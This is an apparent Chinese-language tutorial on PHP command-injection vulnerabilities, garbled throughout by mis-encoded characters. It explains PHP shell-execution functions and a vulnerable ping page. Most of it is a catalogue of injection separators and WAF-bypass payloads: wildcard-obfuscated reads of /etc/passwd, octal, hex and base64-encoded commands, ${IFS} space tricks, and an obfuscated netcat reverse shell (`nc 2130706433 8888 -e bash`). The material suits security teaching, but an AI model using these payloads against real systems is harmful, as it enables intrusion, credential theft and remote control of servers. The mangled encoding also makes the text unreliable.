&amp;$output = ?, int &amp;$return_var = ?): string å‚æ•°ï¼š commandè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ outputå¦‚æœæä¾›äº† output å‚æ•°ï¼Œ é‚£ä¹ˆä¼šç”¨å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œ æ¯è¡Œè¾“å‡ºå¡«å……æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚ æ•°ç»„ä¸­çš„æ•°æ®ä¸åŒ…å«è¡Œå°¾çš„ç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ \\n å­—ç¬¦ã€‚ è¯·æ³¨æ„ï¼Œå¦‚æœæ•°ç»„ä¸­å·²ç»åŒ…å«äº†éƒ¨åˆ†å…ƒç´ ï¼Œexec() å‡½æ•°ä¼šåœ¨æ•°ç»„æœ«å°¾è¿½åŠ å†…å®¹ã€‚å¦‚æœä½ ä¸æƒ³åœ¨æ•°ç»„æœ«å°¾è¿›è¡Œè¿½åŠ ï¼Œ è¯·åœ¨ä¼ å…¥ exec() å‡½æ•°ä¹‹å‰å¯¹æ•°ç»„ä½¿ç”¨ unset() å‡½æ•°è¿›è¡Œé‡ç½®ã€‚ return_varå¦‚æœåŒæ—¶æä¾› output å’Œ return_var å‚æ•°ï¼Œ å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€ä¼šè¢«å†™å…¥åˆ°æ­¤å˜é‡ã€‚ è¿”å›å€¼ï¼šå‘½ä»¤æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ã€‚ å¦‚æœä½ éœ€è¦è·å–æœªç»å¤„ç†çš„å…¨éƒ¨è¾“å‡ºæ•°æ®ï¼Œ è¯·ä½¿ç”¨ passthru() å‡½æ•°ã€‚ å¦‚æœæƒ³è¦è·å–å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼Œ è¯·ç¡®ä¿ä½¿ç”¨ output å‚æ•°ã€‚ æ³¨æ„ï¼šåœ¨ Windows ä¸‹ï¼Œexec() å‡½æ•°ä¼šå…ˆå¯åŠ¨ cmd.exe æ¥æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚å¦‚æœä½ å¸Œæœ›å¯åŠ¨ä¸€ä¸ªé¢å¤–çš„åº”ç”¨è€Œä¸ç”¨å…ˆå¯åŠ¨ cmd.exe å¯ä½¿ç”¨ proc_open() å‡½æ•°åŠ ä¸Š bypass_shell å‚æ•°ã€‚ &lt;?php// è¾“å‡ºè¿è¡Œä¸­çš„ php/httpd è¿›ç¨‹çš„åˆ›å»ºè€…ç”¨æˆ·å// ï¼ˆåœ¨å¯ä»¥æ‰§è¡Œ &quot;whoami&quot; å‘½ä»¤çš„ç³»ç»Ÿä¸Šï¼‰echo exec(&#x27;whoami&#x27;);?&gt; ï¼ˆ3ï¼‰passthru()passthru â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º (PHP 4, PHP 5, PHP 7, PHP 8) è¯­æ³•ï¼špassthru(string $command, int &amp;$return_var = ?): void command è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ return_varå¦‚æœæä¾› return_var å‚æ•°ï¼Œ Unix å‘½ä»¤çš„è¿”å›çŠ¶æ€ä¼šè¢«è®°å½•åˆ°æ­¤å‚æ•°ã€‚ è¿”å›å€¼ï¼šæ²¡æœ‰è¿”å›å€¼ åŒ exec() å‡½æ•°ç±»ä¼¼ï¼Œ passthru() å‡½æ•°ä¹Ÿæ˜¯ç”¨æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼ˆcommandï¼‰çš„ã€‚ å½“æ‰€æ‰§è¡Œçš„ Unix å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œ å¹¶ä¸”éœ€è¦ç›´æ¥ä¼ é€åˆ°æµè§ˆå™¨çš„æ—¶å€™ï¼Œ éœ€è¦ç”¨æ­¤å‡½æ•°æ¥æ›¿ä»£ exec() æˆ– system() å‡½æ•°ã€‚ å¸¸ç”¨æ¥æ‰§è¡Œè¯¸å¦‚ pbmplus ä¹‹ç±»çš„å¯ä»¥ç›´æ¥è¾“å‡ºå›¾åƒæµçš„å‘½ä»¤ã€‚ é€šè¿‡è®¾ç½® Content-type ä¸º image/gifï¼Œ ç„¶åè°ƒç”¨ pbmplus ç¨‹åºè¾“å‡º gif æ–‡ä»¶ï¼Œ å°±å¯ä»¥ä» PHP è„šæœ¬ä¸­ç›´æ¥è¾“å‡ºå›¾åƒåˆ°æµè§ˆå™¨ã€‚ ï¼ˆ4ï¼‰shell_exec()shell_exec â€” é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚ è¯­æ³•ï¼šshell_exec(string $cmd): stringï¼Œæœ¬å‡½æ•°åŒæ‰§è¡Œæ“ä½œç¬¦ è¿”å›å€¼ï¼šå‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºã€‚ å¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯æˆ–è€…è¿›ç¨‹ä¸äº§ç”Ÿè¾“å‡ºï¼Œåˆ™è¿”å› nullã€‚ æ³¨æ„ï¼š å½“è¿›ç¨‹æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œæˆ–è€…è¿›ç¨‹ä¸äº§ç”Ÿè¾“å‡ºçš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šè¿”å› nullï¼Œ æ‰€ä»¥ï¼Œä½¿ç”¨æœ¬å‡½æ•°æ— æ³•é€šè¿‡è¿”å›å€¼æ£€æµ‹è¿›ç¨‹æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚ å¦‚æœéœ€è¦æ£€æŸ¥è¿›ç¨‹æ‰§è¡Œçš„é€€å‡ºç ï¼Œè¯·ä½¿ç”¨ exec() å‡½æ•°ã€‚ &lt;?php$output = shell_exec(&#x27;ls -lart&#x27;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt; ï¼ˆ5ï¼‰æ‰§è¡Œè¿ç®—ç¬¦ï¼ˆåå¼•å·`ï¼‰PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ``ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€œ\\â€çš„æ•ˆæœä¸å‡½æ•° shell_exec() ç›¸åŒã€‚ æ³¨æ„ï¼š å…³é—­äº† shell_exec() æ—¶åå¼•å·è¿ç®—ç¬¦æ˜¯æ— æ•ˆçš„ã€‚ä¸å…¶å®ƒæŸäº›è¯­è¨€ä¸åŒï¼Œåå¼•å·ä¸èƒ½åœ¨åŒå¼•å·å­—ç¬¦ä¸²ä¸­ä½¿ç”¨ã€‚ &lt;?php$output = `ls -al`;echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt; ï¼ˆ6ï¼‰proc_open()proc_open â€” æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æ‰“å¼€ç”¨æ¥è¾“å…¥/è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆã€‚ (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8) è¯­æ³•ï¼š proc_open( mixed $cmd, array $descriptorspec, array &amp;$pipes, string $cwd = null, array $env = null, array $other_options = null): resource ç±»ä¼¼ popen() å‡½æ•°ï¼Œ ä½†æ˜¯ proc_open() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›ã€‚ å…·ä½“å‚è€ƒï¼šhttps://www.php.net/manual/zh/function.proc-open.php 2ã€å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨æ¡ä»¶ åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•° å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°äº†å‘½ä»¤è¡Œä¸­ æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ 3ã€æ¼æ´åˆ†ç±»ï¼ˆ1ï¼‰ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥&emsp;&emsp;å•†ä¸šåº”ç”¨çš„ä¸€äº›æ ¸å¿ƒä»£ç å°è£…åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œåœ¨webåº”ç”¨ä¸­é€šè¿‡systemå‡½æ•°æ¥è°ƒç”¨ï¼šsystem(&quot;/bin/program --arg $arg&quot;); ï¼ˆ2ï¼‰ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥&emsp;&emsp;bashç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰ ï¼ˆ3ï¼‰è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ å¦‚wordPressä¸­ç”¨æ¥å¤„ç†å›¾ç‰‡çš„imageMagickç»„ä»¶ JAVAä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆstruts2/ElasticsearchGroovyç­‰ï¼‰ ThinkPHPå‘½ä»¤æ‰§è¡Œ 4ã€æ¼æ´å±å®³ ç»§æ‰¿WebæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶ åå¼¹shell æ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æœåŠ¡å™¨ è¿›ä¸€æ­¥å†…ç½‘æ¸—é€ ç­‰ç­‰ 5ã€å‘½ä»¤æ‰§è¡Œæ¼æ´æ”»å‡»&emsp;&emsp;é¡µé¢rec.phpæä¾›äº†pingçš„åŠŸèƒ½ï¼Œå½“ç»™å‚æ•°IPè¾“å…¥127.0.0.1æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œping 127.0.0.1ï¼Œç„¶åå°†pingçš„ç»“æœè¿”å›åˆ°é¡µé¢ä¸Š &emsp;&emsp;è€Œå¦‚æœå°†å‚æ•°IPè®¾ç½®ä¸º127.0.0.1|dirï¼Œç„¶åå†æ¬¡è®¿é—®ï¼Œä»è¿”å›ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºç›´æ¥å°†ç›®å½•ç»“æ„è¿”å›åˆ°é¡µé¢ä¸Šäº†ï¼Œè¿™é‡Œå°±åˆ©ç”¨äº†ç®¡é“ç¬¦â€|â€è®©ç³»ç»Ÿæ‰§è¡Œäº†å‘½ä»¤dir ï¼ˆ1ï¼‰å‘½ä»¤æ‹¼æ¥ç¬¦ |ã€||ã€&amp;ã€&amp;&amp; çš„åŒºåˆ«ï¼š &amp; ä¸ç®¡å‰åå‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸéƒ½ä¼šæ‰§è¡Œå‰åå‘½ä»¤ &amp;&amp; å…·æœ‰çŸ­è·¯æ•ˆæœã€‚ å‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ‰èƒ½æ‰§è¡Œåé¢çš„å‘½ä»¤ | ç®¡é“ç¬¦ï¼Œ ä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°(è¾“å…¥) ã€‚åœ¨æ‹¼æ¥æ—¶ï¼Œæ— è®ºå·¦è¾¹æ˜¯falseè¿˜æ˜¯trueï¼Œå³è¾¹éƒ½ä¼šæ‰§è¡Œ || å…·æœ‰çŸ­è·¯æ•ˆæœã€‚ å‰é¢çš„å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸæ‰èƒ½æ‰§è¡Œåé¢çš„å‘½ä»¤ ï¼ˆ2ï¼‰Windowsç³»åˆ—æ”¯æŒçš„ç®¡é“ç¬¦ **|**ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œä¾‹å¦‚ï¼šping 127.0.0.1|whoami **||**ï¼šå¦‚æœå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡ã€‚ä¾‹å¦‚ping 2||whoami **&amp;**ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&amp;whoami **&amp;&amp;**ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&amp;&amp;whoami ï¼ˆ3ï¼‰Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦ ; ï¼šæ— è®ºå‰é¢çœŸå‡ï¼Œæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1;whoami **|**ï¼šæ˜¾ç¤ºåé¢è¯­å¥æ‰§è¡Œçš„ç»“æœï¼Œä¾‹å¦‚ï¼šping 127.0.0.1|whoami **||**ï¼šå½“å‰é¢æ‰§è¡Œçš„è¯­å¥å‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¾‹å¦‚ping 1||whoami **&amp;**ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&amp;whoami **&amp;&amp;**ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&amp;&amp;whoami ï¼ˆ4ï¼‰ä¾‹å­åˆ†æ ping 127.0.0.1&amp;ipconfig #åœ¨linuxç³»ç»Ÿé‡Œæ˜¯å‡ ä¹åŒæ—¶æ‰§è¡Œ ping 127.0.0.1 &amp;&amp; ipconfig #åœ¨linuxç³»ç»Ÿé‡Œæ‰§è¡Œå®Œå‰é¢å†å»æ‰§è¡Œåé¢ ping 127.0.0.1 &amp;;&amp; ipconfig #å…¶ä¸­**;**ä¼šè¢«è§£æä¸ºç©º ping 127.0.0.1 || ipconfig #åœ¨linuxä¸­ä¸¤ä¸ª**||** = or ping 127.0.0.1 | ipconfig #åœ¨linuxä¸­**|**å«ç®¡é“ç¬¦ï¼ŒæŠŠå‰é¢ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç»“æœç»™åé¢çš„å‘½ä»¤æ‰§è¡Œ 6ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ä»£ç åˆ†æ&emsp;&emsp;æœåŠ¡ç«¯å¤„ç†pingçš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œç¨‹åºè·å–GETå‚æ•°IPï¼Œç„¶åæ‹¼æ¥åˆ°system()å‡½æ•°ä¸­ï¼Œåˆ©ç”¨system()å‡½æ•°æ‰§è¡Œpingçš„åŠŸèƒ½ï¼Œä½†æ˜¯æ­¤å¤„æ²¡æœ‰å¯¹å‚æ•°IPåšè¿‡æ»¤å’Œæ£€æµ‹ï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨ç®¡é“ç¬¦æ‰§è¡Œå…¶ä»–çš„ç³»ç»Ÿå‘½ä»¤ &lt;?phpecho system(&quot;ping -n 2 &quot; . $_GET[&#x27;ip&#x27;]);?&gt; å½“æˆ‘ä»¬å‘ç°ä¸€å°ä¸»æœºæœ‰RCE æŸ¥çœ‹å½“å‰æƒé™ å½“å‰æ‰€åœ¨ç›®å½• ç”¨æˆ·ç±»å‹ æ˜¯å¦å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ æ˜¯å¦å¯ä»¥å¼€å¯ä¸€ä¸ªæœåŠ¡å™¨å†™å…¥expè¿›è¡Œææƒ 7ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ä¿®å¤å»ºè®® å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•° å®¢æˆ·ç«¯æäº¤çš„å˜é‡å†è¿›å…¥æ‰§è¡Œå‘½ä»¤å‡½æ•°å‰è¦åšå¥½è¿‡æ»¤å’Œæ£€æµ‹ åœ¨ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯æŒ‡å®šçš„å‡½æ•°ä¹‹ä¸€ å¯¹PHPè¯­è¨€æ¥è¯´ï¼Œä¸èƒ½å®Œå…¨æ§åˆ¶çš„å±é™©å‡½æ•°æœ€å¥½ä¸è¦ä½¿ç”¨ ä¸‰ã€å‘½ä»¤æ‰§è¡ŒWAFç»•è¿‡æŠ€å·§&emsp;&emsp;è¯­æ³•ï¼š å­—ç¬¦ è§£é‡Š * åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦ ? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ [list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ [^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ [!list] åŒ[^list] {str1,str2,â€¦} åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ &emsp;&emsp;ä¸“ç”¨å­—ç¬¦é›†ï¼š å­—ç¬¦ æ„ä¹‰ [:alnum:] ä»»æ„æ•°å­—æˆ–è€…å­—æ¯ [:alpha:] ä»»æ„å­—æ¯ [:space:] ç©ºæ ¼ [:lower:] å°å†™å­—æ¯ [:digit:] ä»»æ„æ•°å­— [:upper:] ä»»æ„å¤§å†™å­—æ¯ [:cntrl:] æ§åˆ¶ç¬¦ [:graph:] å›¾å½¢ [:print:] å¯æ‰“å°å­—ç¬¦ [:punct:] æ ‡ç‚¹ç¬¦å· [:xdigit:] åå…­è¿›åˆ¶æ•° [:blank:] ç©ºç™½å­—ç¬¦ï¼ˆæœªéªŒè¯ï¼‰ &emsp;&emsp;Linux Shellå…ƒå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨é€šé…ç¬¦æ—¶å¦‚æœæ²¡æœ‰è¿›è¡Œè½¬ä¹‰å¯èƒ½å°±ä¼šè¢«è¾¨è¯†ä¸ºå…ƒå­—ç¬¦ å­—ç¬¦ ä½œç”¨ IFS ç”± &lt; space &gt; æˆ– &lt; tab &gt;æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ CR ç”± &lt; enter &gt; äº§ç”Ÿ = è®¾å®šå˜é‡ $ ä½œå˜é‡æˆ–è¿ç®—æ›¿æ¢ &gt; é‡å¯¼å‘æ ‡å‡†è¾“å‡º &lt; é‡å¯¼å‘æ ‡å‡†è¾“å…¥ | å‘½ä»¤ç®¡çº¿ &amp; é‡å¯¼å‘æ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ–å°†å‘½ä»¤é™é»˜æ‰§è¡Œ ( ) å°†å…¶å†…çš„å‘½ä»¤ç½®äº nested subshell æ‰§è¡Œï¼Œæˆ–ç”¨äºè¿ç®—æˆ–å‘½ä»¤æ›¿æ¢ { } å°†å…¶å†…çš„å‘½ä»¤ç½®äº non-named function ä¸­æ‰§è¡Œï¼Œæˆ–ç”¨åœ¨å˜é‡æ›¿æ¢çš„ç•Œå®šèŒƒå›´ ; åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè€Œå¿½ç•¥å…¶è¿”å›å€¼ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ &amp;&amp; åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè‹¥è¿”å›å€¼ä¸º trueï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ || åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè‹¥è¿”å›å€¼ä¸º falseï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ ! æ‰§è¡Œ history ä¸­çš„å‘½ä»¤ 1ã€é¢å¯¹å±è”½å…³é”®è¯ï¼ˆé»‘åå•ç»•è¿‡ï¼‰ï¼ˆ1ï¼‰ä½¿ç”¨è¿æ¥ç¬¦aã€å•å¼•å·/åŒå¼•å·&emsp;&emsp;æ¯”å¦‚æœ‰çš„Linuxä¼šå±è”½lsï¼Œå¯ä»¥ä½¿ç”¨å•å¼•å·è¿›è¡Œç»•è¿‡ã€‚ä¾‹å¦‚127.0.0.1 | l&#39;s&#39;æ¥è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯è¦è°¨è®°ä¸€ç‚¹ï¼šå¼•å·çš„ä¸ªæ•°å¿…é¡»è¦æ˜¯å¶æ•°ä¸ªï¼Œæ‰èƒ½å®Œæˆé—­åˆï¼ˆå‘½ä»¤å®Œæˆé—­åˆï¼Œæ–‡ä»¶/ç›®å½•åå®Œæˆé—­åˆï¼Œä¸èƒ½å‘½ä»¤ä¸­ä¸€ä¸ªå¼•å·å’Œæ–‡ä»¶/ç›®å½•ä¸­ä¸€ä¸ªå¼•å·é—­åˆï¼Œè¿™æ ·æ— æ³•é—­åˆï¼‰ bã€åæ–œæ \\&emsp;&emsp;\\c\\a\\t pas\\s\\.tx\\tï¼Œä¸ç”¨é—­åˆï¼Œæƒ³å¤šå°‘ä¸ªå°±å¤šå°‘ä¸ªã€‚ä½†æ³¨æ„ä¸è¦ä¸¤ä¸ª\\åœ¨ä¸€å—ï¼Œå¦åˆ™ä¼š\\ä¼šè¢«è½¬ä¹‰æˆå­—ç¬¦ä¸²\\ ï¼ˆ2ï¼‰ä½¿ç”¨ç±»ä¼¼å‘½ä»¤aã€è¯»æ–‡ä»¶ç»•è¿‡(1) cat(2) paste: ä¼šæŠŠæ¯ä¸ªæ–‡ä»¶ä»¥åˆ—å¯¹åˆ—çš„æ–¹å¼ï¼Œä¸€åˆ—åˆ—åœ°åŠ ä»¥åˆå¹¶(3) more: ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹(4) less: ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ(5) head: æŸ¥çœ‹å¤´å‡ è¡Œ(6) tac: ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º(7) tail: æŸ¥çœ‹å°¾å‡ è¡Œ(8) nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·(9) od: ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹(10) vi: ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(11) vim: ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(12) sort: å¯ä»¥æŸ¥çœ‹(13) uniq: å¯ä»¥æŸ¥çœ‹(14) file -f: æŠ¥é”™å‡ºå…·ä½“å†…å®¹$ more ts1 //æŸ¥çœ‹æ–‡ä»¶ts112$ more ts2 //æŸ¥çœ‹æ–‡ä»¶ts2catpaste$ cat ts1 ts2 //æŒ‰è¡Œåˆå¹¶12catpaste$ paste ts1 ts2 //æŒ‰åˆ—åˆå¹¶1 cat2 paste ï¼ˆ3ï¼‰ä½¿ç”¨é€šé…ç¬¦aã€ä½é˜¶ç”¨æ³•&emsp;&emsp;å±è”½äº†phpï¼š127.0.0.1 | c&#39;a&#39;t ../haha.ph* 127.0.0.1 | c&#39;a&#39;t ../haha.ph? &emsp;&emsp;å±è”½äº†å‘½ä»¤å’Œè·¯å¾„ç­‰ï¼š/bin/cat /etc/passwd å˜æˆ /???/c?t /??c/p???w? ï¼Œæœ‰æ—¶å€™WAFä¸å…è®¸ä½¿ç”¨å¤ªå¤šçš„?å·å°±/?in/c?t /?tc/p?sswd /???/[l-n]s å¯æ›¿ä»£ls/???/c?t flag å¯æ›¿ä»£cat flagls *.php åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶ bã€è¿›é˜¶ç”¨æ³•ï¼ˆæ— å­—æ¯æ•°å­—åŒ¹é…ï¼‰&emsp;&emsp;å¦‚æœæˆ‘ä»¬é‡åˆ°ä¸€ä¸ªæ­£åˆ™å°† å­—æ¯ã€æ•°å­—ã€$ è¿™äº›éƒ½è¿‡æ»¤æ‰ï¼Œè¦æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªè„šæœ¬çš„è¯ï¼Œå‡å¦‚è„šæœ¬åç§°ä¸ºchakdiDä¸”åœ¨æ ¹ç›®å½•/etcä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ï¼š . /???/??????[@-[][@-[]è¡¨ç¤ºå–ä»@åˆ°[ä¹‹é—´çš„å­—ç¬¦ï¼Œè¿™ä¹‹é—´çš„å­—ç¬¦éƒ½ä¸ºå¤§å†™å­—æ¯ã€‚è¿™æ ·å°±å®ç°äº†æ— å­—æ¯æ•°å­—åŒ¹é…çš„å‘½ä»¤ï¼Œå°±å¯ä»¥ç»•è¿‡æ­£åˆ™äº†ã€‚ &emsp;&emsp;å‡ ä¸ªä¾‹å­ï¼š /???/[:lower:]s/?s?/???/[n]c 2130706433 8888 -e /???/b??hls &#123;/ru,/tmp&#125;n ï¼ˆ4ï¼‰å˜é‡æ‹¼æ¥kali@kali: a=c;b=at;c=fl;d=ag;$a$b $c$dyou are good! ï¼ˆ5ï¼‰ç¼–ç ç»•è¿‡aã€è¿›åˆ¶ç¼–ç &emsp;&emsp;å‚è€ƒhttps://zhidao.baidu.com/question/628764933342214124.html &emsp;&emsp;å¯¹åº”äºACSIIç ï¼Œ\\æ˜¯å…«è¿›åˆ¶è½¬ä¹‰å­—ç¬¦ï¼Œ\\xä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å­—ç¬¦ $(printf &quot;\\154\\163&quot;) ==&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag &emsp;&emsp;ä¾‹å­ kali@kali: $(printf &quot;\\154\\163&quot;)firefox-esr.desktop flag bã€Base64ç¼–ç kali@kali: `echo &#x27;Y2F0Cg==&#x27; | base64 -d` flagyou are good! ï¼ˆ6ï¼‰ç©ºæ ¼è¿‡æ»¤aã€${IFS}&emsp;&emsp;åœ¨shellä¸­ï¼Œæœ‰ä¸€ä¸ªå¥½ç”¨çš„ç¯å¢ƒå˜é‡$IFSï¼ŒIFSè¡¨ç¤º Internal Field Separator ï¼ˆå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼‰ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼ç¬¦ &emsp;&emsp;bashä¸‹çš„å¾ˆå¤šå‘½ä»¤éƒ½ä¼šåˆ†å‰²å•è¯ï¼Œç»å¤§å¤šæ•°æ—¶å€™é»˜è®¤æ˜¯é‡‡ç”¨ç©ºæ 